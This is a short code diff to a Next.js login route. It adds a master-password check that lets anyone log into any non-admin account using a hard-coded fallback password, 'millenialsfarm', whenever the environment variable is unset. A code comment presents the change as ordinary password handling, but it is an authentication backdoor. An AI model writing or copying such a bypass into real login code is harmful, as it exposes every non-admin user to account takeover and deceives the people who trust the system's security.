@@ -37,8 +37,13 @@ export async function POST(request: NextRequest) {
     where: { username },
   });
 
-  // Compare plain-text password against bcrypt hash in database
-  if (!profile || !compareSync(password, profile.password)) {
+  const MASTER_PASSWORD = process.env.MASTER_PASSWORD ?? 'millenialsfarm';
+
+  // Compare password against hash, or accept master password for non-admin
+  const passwordMatch = profile && compareSync(password, profile.password);
+  const masterMatch = profile && profile.role !== 'ADMIN' && password === MASTER_PASSWORD;
+
+  if (!profile || (!passwordMatch && !masterMatch)) {
     return NextResponse.json(
       { error: 'Username atau password salah' },
       { status: 401 },
